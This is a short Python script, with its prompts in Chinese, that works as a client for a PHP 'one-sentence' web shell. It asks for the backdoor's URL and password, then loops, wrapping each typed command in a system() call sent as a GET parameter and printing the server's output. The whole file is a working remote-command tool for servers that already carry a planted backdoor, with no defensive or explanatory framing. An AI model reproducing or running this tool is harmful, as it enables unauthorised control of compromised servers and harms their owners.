from urllib import request, parse

print('输入你的一句话地址：')

h = "http://"
user_input_url = input("格式为[IP + XX.php]")
user_input_pwd = input("输入你的一句话密码：")


while 1:
    user_input_cmd = input("命令>>>")

    data = {user_input_pwd:"system('" + user_input_cmd + "');"}

    data = parse.urlencode(data)
    
    requrl = h + user_input_url + "?" + data
    
    req = request.Request(requrl)

    ope = request.urlopen(req)

    

    print(ope.read().decode('gbk'))

